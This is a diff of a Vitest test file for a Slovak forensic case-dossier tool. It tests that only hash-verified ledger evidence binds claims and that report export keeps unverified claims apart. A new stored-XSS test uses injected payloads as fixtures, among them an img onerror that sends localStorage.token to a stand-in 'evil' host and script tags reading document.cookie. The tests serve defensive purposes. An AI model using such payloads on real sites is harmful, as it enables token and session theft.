@@ -1,40 +1,36 @@
 import { describe, expect, it } from "vitest";
 import { ARMIVEX_CASE_DOSSIER } from "../demo-dossier";
 import {
-  collectEvidenceIds,
+  NO_VERIFIED_EVIDENCE,
   isBoundToEvidence,
   isValidEvidenceReference,
-  resolveEvidenceReference,
   partitionAdmissibilityAudit,
   partitionAlternativeHypotheses,
   partitionSuspiciousFlows,
   partitionTimeline,
+  verifiedEvidenceIds,
 } from "../evidence-binding";
-import { buildReportHTML } from "../export-pdf";
+import { buildReportHTML, escapeHtml } from "../export-pdf";
 import type { ForensicDossier, TimelineEvent } from "../types";
 
-const KNOWN_DOC = "armivex-synthetic-demo";
-const UNKNOWN_DOC = "hallucinated-doc-999";
+/** Hash-overený dôkaz vo WORM ledgeri (evidence_items.id). */
+const VERIFIED = "11111111-1111-4111-8111-111111111111";
+const PENDING = "22222222-2222-4222-8222-222222222222";
+const UNKNOWN = "99999999-9999-4999-8999-999999999999";
 
-function dossierWith(
-  timeline: TimelineEvent[],
-): ForensicDossier {
-  const base: ForensicDossier = JSON.parse(JSON.stringify(ARMIVEX_CASE_DOSSIER));
-  base.custodyLedger = [
-    ...(base.custodyLedger ?? []),
-    {
-      index: 2,
-      id: "CL-TEST",
-      traceId: KNOWN_DOC,
-      timestamp: "2026-01-01T00:00:00Z",
-      actor: "Vyšetrovateľ",
-      action: "SEIZURE",
-      location: "Bratislava",
-      payloadHash: "0".repeat(64),
-      prevHash: "1".repeat(64),
-      hash: "2".repeat(64),
-    },
-  ];
+const LEDGER = [
+  { id: VERIFIED, integrityStatus: "verified", sha256Hash: "a".repeat(64), fileName: "zapisnica.pdf" },
+  { id: PENDING, integrityStatus: "checking", sha256Hash: "b".repeat(64), fileName: "vypis.csv" },
+  { id: "33333333-3333-4333-8333-333333333333", integrityStatus: "compromised", fileName: "x.pdf" },
+];
+const known = verifiedEvidenceIds(LEDGER);
+
+function clone(): ForensicDossier {
+  return JSON.parse(JSON.stringify(ARMIVEX_CASE_DOSSIER)) as ForensicDossier;
+}
+
+function dossierWith(timeline: TimelineEvent[]): ForensicDossier {
+  const base = clone();
   base.facts.timeline = timeline;
   base.financialAnalysis = {
     totalVolume: 1000,
@@ -51,7 +47,7 @@ function dossierWith(
         method: "cash_deposit",
         purpose: "Vklad hotovosti",
         redFlag: "Štruktúrované vklady",
-        sourceRef: { documentId: KNOWN_DOC, page: 3 },
+        sourceRef: { documentId: "zapisnica.pdf", evidenceId: VERIFIED, page: 3 },
       },
       {
         id: "flow-unbound",
@@ -73,7 +69,7 @@ const boundEvent: TimelineEvent = {
   time: "2026-01-05 10:00",
   event: "Zadržanie hotovosti pri kontrole",
   source: "Zápisnica č. 7",
-  sourceRef: { documentId: KNOWN_DOC, page: 7, excerpt: "Zápisnica s. 7" },
+  sourceRef: { documentId: "zapisnica.pdf", evidenceId: VERIFIED, page: 7, excerpt: "Zápisnica s. 7" },
   chainBreak: false,
 };
 
@@ -84,264 +80,178 @@ const unboundEvent: TimelineEvent = {
   chainBreak: false,
 };
 
-describe("collectEvidenceIds (P1-01)", () => {
-  it("spočíta documentId z analysisMeta a traceId/id z custody ledgera", () => {
-    const base = JSON.parse(
-      JSON.stringify(ARMIVEX_CASE_DOSSIER),
-    ) as ForensicDossier;
-    base.custodyLedger = [
+describe("verifiedEvidenceIds — WORM ledger is the only evidence source", () => {
+  it("accepts only hash-verified ledger records", () => {
+    expect([...known]).toEqual([VERIFIED]);
+    expect(verifiedEvidenceIds([])).toEqual(new Set());
+    expect(verifiedEvidenceIds(null)).toEqual(new Set());
+    expect(verifiedEvidenceIds([{ id: "  ", integrityStatus: "verified" }])).toEqual(new Set());
+  });
+
+  it("never treats the AI-generated custody ledger or file names as evidence", () => {
+    const dossier = dossierWith([
       {
-        index: 1,
-        id: "entry-1",
-        traceId: "trace-abc",
+        ...unboundEvent,
+        event: "Tvrdenie viazané na podvrhnutý custody záznam",
+        sourceRef: { documentId: "zapisnica.pdf", evidenceId: "TRACE-FORGED", page: 1 },
+      },
+    ]);
+    dossier.custodyLedger = [
+      {
+        index: 0,
+        id: "CL-FORGED",
+        traceId: "TRACE-FORGED",
         timestamp: "2026-01-01T00:00:00Z",
-        actor: "Vyšetrovateľ",
+        actor: "AI",
         action: "SEIZURE",
-        location: "Bratislava",
+        location: "—",
         payloadHash: "0".repeat(64),
         prevHash: "0".repeat(64),
-        hash: "1".repeat(64),
+        hash: "0".repeat(64),
       },
     ];
-    const ids = collectEvidenceIds(base);
-    expect(ids.has(KNOWN_DOC)).toBe(true);
-    expect(ids.has("trace-abc")).toBe(true);
-    expect(ids.has("entry-1")).toBe(false);
-    expect(ids.has("   ")).toBe(false);
+    dossier.analysisMeta = { ...dossier.analysisMeta!, documentIds: ["zapisnica.pdf"] };
+    expect(partitionTimeline(dossier, known).bound).toEqual([]);
+    const hyps = dossier.alternativeHypotheses ?? [];
+    hyps[0]!.sourceReferences = [{ evidenceId: "TRACE-FORGED", page: 2 }];
+    expect(partitionAlternativeHypotheses(hyps, known).bound).toEqual([]);
   });
 });
 
 describe("evidence references for legal conclusions", () => {
-  const known = new Set([KNOWN_DOC]);
-  it("requires an existing evidence ID and a concrete page or paragraph locator", () => {
-    expect(
-      isValidEvidenceReference(
-        { evidenceId: KNOWN_DOC, page: 2 },
-        known,
-      ),
-    ).toBe(true);
-    expect(
-      isValidEvidenceReference(
-        { evidenceId: KNOWN_DOC, paragraph: "odsek 4" },
-        known,
-      ),
-    ).toBe(true);
-    expect(
-      isValidEvidenceReference(
-        { evidenceId: KNOWN_DOC, paragraph: "§ 119 ods. 2 TP" },
-        known,
-      ),
-    ).toBe(false);
-    expect(
-      isValidEvidenceReference({ evidenceId: KNOWN_DOC }, known),
-    ).toBe(false);
-    expect(
-      isValidEvidenceReference(
-        { evidenceId: UNKNOWN_DOC, page: 2 },
-        known,
-      ),
-    ).toBe(false);
-    expect(
-      isValidEvidenceReference(
-        { evidenceId: KNOWN_DOC, page: 0 },
-        known,
-      ),
-    ).toBe(false);
-  });
-
-  it("resolves only known ledger aliases to persistent evidence IDs", () => {
-    const aliases = new Map([["E1", "persistent-evidence-1"]]);
-    expect(
-      resolveEvidenceReference(
-        { evidenceId: "E1", page: 3 },
-        aliases,
-      ),
-    ).toEqual({ evidenceId: "persistent-evidence-1", page: 3 });
-    expect(
-      resolveEvidenceReference(
-        { evidenceId: "E2", page: 3 },
-        aliases,
-      ),
-    ).toBeNull();
-    expect(
-      resolveEvidenceReference({ evidenceId: "E1" }, aliases),
-    ).toBeNull();
+  it("requires a verified evidence ID and a concrete page or paragraph locator", () => {
+    expect(isValidEvidenceReference({ evidenceId: VERIFIED, page: 2 }, known)).toBe(true);
+    expect(isValidEvidenceReference({ evidenceId: VERIFIED, paragraph: "odsek 4" }, known)).toBe(true);
+    expect(isValidEvidenceReference({ evidenceId: VERIFIED, paragraph: "§ 119 ods. 2 TP" }, known)).toBe(false);
+    expect(isValidEvidenceReference({ evidenceId: VERIFIED }, known)).toBe(false);
+    expect(isValidEvidenceReference({ evidenceId: VERIFIED, page: 0 }, known)).toBe(false);
+    expect(isValidEvidenceReference({ evidenceId: PENDING, page: 2 }, known)).toBe(false);
+    expect(isValidEvidenceReference({ evidenceId: UNKNOWN, page: 2 }, known)).toBe(false);
   });
 
   it("partitions hypotheses and audit claims fail-closed", () => {
-    const dossier = JSON.parse(
-      JSON.stringify(ARMIVEX_CASE_DOSSIER),
-    ) as ForensicDossier;
+    const dossier = clone();
     const hypotheses = dossier.alternativeHypotheses ?? [];
-    hypotheses[0]!.sourceReferences = [{ evidenceId: KNOWN_DOC, page: 4 }];
-    hypotheses[1]!.sourceReferences = [
-      { evidenceId: UNKNOWN_DOC, paragraph: "odsek 3" },
-    ];
-    const hypothesisPartition = partitionAlternativeHypotheses(
-      hypotheses,
-      known,
-    );
-    expect(hypothesisPartition.bound.map((item) => item.id)).toEqual(["AH-1"]);
-    expect(hypothesisPartition.unbound.map((item) => item.id)).toEqual(["AH-2"]);
+    hypotheses[0]!.sourceReferences = [{ evidenceId: VERIFIED, page: 4 }];
+    hypotheses[1]!.sourceReferences = [{ evidenceId: PENDING, paragraph: "odsek 3" }];
+    const partition = partitionAlternativeHypotheses(hypotheses, known);
+    expect(partition.bound.map((item) => item.id)).toEqual(["AH-1"]);
+    expect(partition.unbound.map((item) => item.id)).toEqual(["AH-2"]);
 
     const audit = dossier.admissibilityAudit!;
-    audit.sourceReferences = [{ evidenceId: KNOWN_DOC, paragraph: "odsek 2" }];
-    audit.defects[0]!.sourceEvidenceId = KNOWN_DOC;
+    audit.sourceReferences = [{ evidenceId: VERIFIED, paragraph: "odsek 2" }];
+    audit.defects[0]!.sourceEvidenceId = VERIFIED;
     audit.defects[0]!.sourcePage = 8;
     const auditPartition = partitionAdmissibilityAudit(audit, known);
     expect(auditPartition.summaryBound).toBe(true);
     expect(auditPartition.boundDefects).toHaveLength(1);
     expect(auditPartition.unboundDefects).toHaveLength(1);
   });
+
+  it("a single invalid reference makes the whole hypothesis unbound", () => {
+    const [h] = clone().alternativeHypotheses ?? [];
+    h!.sourceReferences = [
+      { evidenceId: VERIFIED, page: 1 },
+      { evidenceId: UNKNOWN, page: 2 },
+    ];
+    expect(partitionAlternativeHypotheses([h!], known).unbound).toHaveLength(1);
+  });
 });
 
-describe("isBoundToEvidence (P1-01)", () => {
-  const known = new Set([KNOWN_DOC]);
-  it("bez sourceRef, s prázdnym aj neznámym documentId nie je viazané", () => {
+describe("isBoundToEvidence", () => {
+  it("needs sourceRef.evidenceId of a verified record; documentId alone is not evidence", () => {
     expect(isBoundToEvidence(undefined, known)).toBe(false);
-    expect(isBoundToEvidence({ documentId: "  " }, known)).toBe(false);
-    expect(isBoundToEvidence({ documentId: UNKNOWN_DOC }, known)).toBe(false);
-  });
-  it("známy documentId je viazaný", () => {
-    expect(isBoundToEvidence({ documentId: KNOWN_DOC, page: 1 }, known)).toBe(
-      true,
-    );
+    expect(isBoundToEvidence({ documentId: "zapisnica.pdf" }, known)).toBe(false);
+    expect(isBoundToEvidence({ documentId: VERIFIED }, known)).toBe(false);
+    expect(isBoundToEvidence({ documentId: "x", evidenceId: PENDING }, known)).toBe(false);
+    expect(isBoundToEvidence({ documentId: "x", evidenceId: VERIFIED }, known)).toBe(false); // bez locatora
+    expect(isBoundToEvidence({ documentId: "x", evidenceId: VERIFIED, page: 1 }, known)).toBe(true);
   });
 });
 
-describe("partition (P1-01)", () => {
-  it("chronológia sa delí na zdrojované a nezdrojované udalosti", () => {
+describe("partition", () => {
+  it("chronology and flows split into bound facts and unbound claims", () => {
     const dossier = dossierWith([boundEvent, unboundEvent]);
-    const { bound, unbound } = partitionTimeline(dossier);
-    expect(bound).toEqual([boundEvent]);
-    expect(unbound).toEqual([unboundEvent]);
+    expect(partitionTimeline(dossier, known)).toEqual({ bound: [boundEvent], unbound: [unboundEvent] });
+    const flows = partitionSuspiciousFlows(dossier, known);
+    expect(flows.bound.map((f) => f.id)).toEqual(["flow-bound"]);
+    expect(flows.unbound.map((f) => f.id)).toEqual(["flow-unbound"]);
   });
 
-  it("toky bez dôkazu padajú do unbound (fail-closed)", () => {
+  it("without a loaded ledger nothing is bound", () => {
     const dossier = dossierWith([boundEvent]);
-    const { bound, unbound } = partitionSuspiciousFlows(dossier);
-    expect(bound.map((f) => f.id)).toEqual(["flow-bound"]);
-    expect(unbound.map((f) => f.id)).toEqual(["flow-unbound"]);
-  });
-
-  it("prázdna množina evidencií znamená, že nič nie je viazané", () => {
-    const dossier = dossierWith([boundEvent]);
-    dossier.analysisMeta = undefined;
-    expect(partitionTimeline(dossier, new Set()).bound).toEqual([]);
-    expect(partitionTimeline(dossier, new Set()).unbound).toEqual([boundEvent]);
+    expect(partitionTimeline(dossier, NO_VERIFIED_EVIDENCE).bound).toEqual([]);
   });
 });
 
-describe("export gate — bez opory nie fakt (P1-01)", () => {
+describe("export gate", () => {
   const dossier = dossierWith([boundEvent, unboundEvent]);
-  const html = buildReportHTML(dossier, new Set([KNOWN_DOC]));
-
+  const html = buildReportHTML(dossier, known);
   const chronologyStart = html.indexOf("<h2>Chronológia skutkov");
   const unboundStart = html.indexOf("<h2>Nezdrojované okolnosti");
 
-  it("zdrojovaná udalosť je v skutkovej chronológií so zdrojom", () => {
-    expect(chronologyStart).toBeGreaterThan(-1);
+  it("a bound event is in the factual chronology, an unbound one only in the unverified section", () => {
     const chronology = html.slice(chronologyStart, unboundStart);
     expect(chronology).toContain("Zadržanie hotovosti");
-    expect(chronology).toContain(KNOWN_DOC);
-  });
-
-  it("nezdrojovaná udalosť NIE je v skutkovej chronológií", () => {
-    expect(unboundStart).toBeGreaterThan(-1);
-    const chronology = html.slice(chronologyStart, unboundStart);
     expect(chronology).not.toContain("UTOK_BEZ_OPORY_V_EVENT");
-    const unboundSection = html.slice(unboundStart, unboundStart + 2000);
-    expect(unboundSection).toContain("UTOK_BEZ_OPORY_V_EVENT");
-    expect(unboundSection).toContain("nie sú skutkom");
+    expect(html.slice(unboundStart, unboundStart + 2000)).toContain("UTOK_BEZ_OPORY_V_EVENT");
   });
 
-  it("viazaný tok je fakt so zdrojom; neviazaný tok nie je v tabuľke faktov", () => {
+  it("a bound flow is a fact, an unbound one is not", () => {
     const financialStart = html.indexOf("Podozrivé finančné toky");
     const unboundFlowsStart = html.indexOf("Toky bez viazania na dôkaz");
-    expect(financialStart).toBeGreaterThan(-1);
-    expect(unboundFlowsStart).toBeGreaterThan(financialStart);
-
     const factTable = html.slice(financialStart, unboundFlowsStart);
     expect(factTable).toContain("Vklad hotovosti");
-    expect(factTable).toContain(KNOWN_DOC);
-
-    // Neviazaný tok sa v tabuľke faktov neobjaví.
     expect(factTable).not.toContain("Prevod bez dokladu");
-    const unboundFlows = html.slice(unboundFlowsStart);
-    expect(unboundFlows).toContain("Prevod bez dokladu");
-    expect(unboundFlows).toContain("nie sú skutkom");
+    expect(html.slice(unboundFlowsStart)).toContain("Prevod bez dokladu");
   });
 
-  it("sekcie bez nezdrojovaných záznamov sa nevykreslia", () => {
-    const clean = dossierWith([boundEvent]);
-    clean.financialAnalysis = {
-      totalVolume: 400,
-      cashVolume: 400,
-      transferVolume: 0,
-      cashRatioPercent: 100,
-      suspiciousFlows: [
-        {
-          id: "flow-bound",
-          date: "2026-01-05",
-          payer: "Subjekt A",
-          recipient: "Subjekt B",
-          amount: 400,
-          method: "cash_deposit",
-          purpose: "Vklad hotovosti",
-          redFlag: "Štruktúrované vklady",
-          sourceRef: { documentId: KNOWN_DOC, page: 3 },
-        },
-      ],
-      financingConclusion: "Testovací záver",
-    };
-    const cleanHtml = buildReportHTML(clean, new Set([KNOWN_DOC]));
-    expect(cleanHtml).not.toContain("Nezdrojované okolnosti");
-    expect(cleanHtml).not.toContain("Toky bez viazania na dôkaz");
+  it("default export (no ledger) binds nothing — every claim is unverified", () => {
+    const failClosed = buildReportHTML(dossierWith([boundEvent]));
+    const chronologyStart2 = failClosed.indexOf("<h2>Chronológia skutkov");
+    const unboundStart2 = failClosed.indexOf("<h2>Nezdrojované okolnosti");
+    expect(unboundStart2).toBeGreaterThan(-1);
+    expect(failClosed.slice(chronologyStart2, unboundStart2)).not.toContain("Zadržanie hotovosti");
   });
 
-  it("exportuje hypotézy a § 119 posúdenie bez väzby výhradne ako neoverené", () => {
-    const dossier = dossierWith([boundEvent]);
-    const html = buildReportHTML(dossier, new Set([KNOWN_DOC]));
-    const unverifiedStart = html.indexOf(
-      "<h2>Neoverené tvrdenia (nie sú skutkom)</h2>",
-    );
+  it("hypotheses and § 119 claims without linkage are exported only as unverified", () => {
+    const d = dossierWith([boundEvent]);
+    const out = buildReportHTML(d, known);
+    const unverifiedStart = out.indexOf("<h2>Neoverené tvrdenia (nie sú skutkom)</h2>");
     expect(unverifiedStart).toBeGreaterThan(-1);
-    const unverified = html.slice(unverifiedStart);
-    expect(unverified).toContain("Finančné prostriedky boli riadnou pôžičkou");
-    expect(unverified).toContain("celkový audit");
-    expect(html.slice(0, unverifiedStart)).not.toContain(
-      "Finančné prostriedky boli riadnou pôžičkou",
-    );
-    expect(html.slice(0, unverifiedStart)).not.toContain(
-      "Rozpor medzi výpoveďou Petra Nováka",
-    );
+    expect(out.slice(unverifiedStart)).toContain("Finančné prostriedky boli riadnou pôžičkou");
+    expect(out.slice(0, unverifiedStart)).not.toContain("Finančné prostriedky boli riadnou pôžičkou");
   });
 
-  it("nepovažuje AI custodyLedger ID za dôveryhodné bez authoritative ID zo servera", () => {
-    const dossier = dossierWith([boundEvent]);
-    dossier.alternativeHypotheses![0]!.sourceReferences = [
-      { evidenceId: KNOWN_DOC, page: 3 },
-    ];
-    const html = buildReportHTML(dossier);
-    expect(html).not.toContain("Alternatívne hypotézy viazané na dôkazy");
-    expect(html).toContain("Neoverené tvrdenia (nie sú skutkom)");
-    expect(html).toContain("Finančné prostriedky boli riadnou pôžičkou");
+  it("bound audit and hypothesis appear in the verified sections", () => {
+    const d = dossierWith([boundEvent]);
+    d.alternativeHypotheses![0]!.sourceReferences = [{ evidenceId: VERIFIED, page: 12 }];
+    d.admissibilityAudit!.sourceReferences = [{ evidenceId: VERIFIED, paragraph: "odsek 5" }];
+    d.admissibilityAudit!.defects[0]!.sourceEvidenceId = VERIFIED;
+    d.admissibilityAudit!.defects[0]!.sourcePage = 10;
+    const out = buildReportHTML(d, known);
+    expect(out).toContain("Alternatívne hypotézy viazané na dôkazy");
+    expect(out).toContain("Audit procesnej prípustnosti (§ 119 TP)");
+  });
+});
+
+describe("export escapes untrusted AI/document text (stored XSS)", () => {
+  it("renders injected markup as text, never as elements", () => {
+    const d = dossierWith([
+      { ...boundEvent, event: `<img src=x onerror="fetch('//evil/'+localStorage.token)">` },
+      { ...unboundEvent, event: "<script>alert(document.cookie)</script>" },
+    ]);
+    d.alternativeHypotheses![0]!.title = `"><svg onload=alert(1)>`;
+    d.alternativeHypotheses![0]!.sourceReferences = [{ evidenceId: VERIFIED, page: 1 }];
+    const out = buildReportHTML(d, known);
+    expect(out).not.toContain("<img src=x");
+    expect(out).not.toContain("<script>alert");
+    expect(out).not.toContain("<svg onload");
+    expect(out).toContain(escapeHtml(`<img src=x onerror="fetch('//evil/'+localStorage.token)">`));
+    expect(out).toContain("&lt;script&gt;alert(document.cookie)&lt;/script&gt;");
   });
 
-  it("zdrojovaný audit a hypotéza sa objavia v samostatných overených sekciách", () => {
-    const dossier = dossierWith([boundEvent]);
-    dossier.alternativeHypotheses![0]!.sourceReferences = [
-      { evidenceId: KNOWN_DOC, page: 12 },
-    ];
-    dossier.admissibilityAudit!.sourceReferences = [
-      { evidenceId: KNOWN_DOC, paragraph: "odsek 5" },
-    ];
-    dossier.admissibilityAudit!.defects[0]!.sourceEvidenceId = KNOWN_DOC;
-    dossier.admissibilityAudit!.defects[0]!.sourcePage = 10;
-    const html = buildReportHTML(dossier, new Set([KNOWN_DOC]));
-    expect(html).toContain("Alternatívne hypotézy viazané na dôkazy");
-    expect(html).toContain("Audit procesnej prípustnosti (§ 119 TP)");
-    expect(html).toContain("Finančné prostriedky boli riadnou pôžičkou");
-    expect(html).toContain("§ 125 TP — curable");
+  it("escapeHtml covers the five HTML metacharacters", () => {
+    expect(escapeHtml(`<a href="x" title='y'>&</a>`)).toBe("&lt;a href=&quot;x&quot; title=&#39;y&#39;&gt;&amp;&lt;/a&gt;");
   });
 });
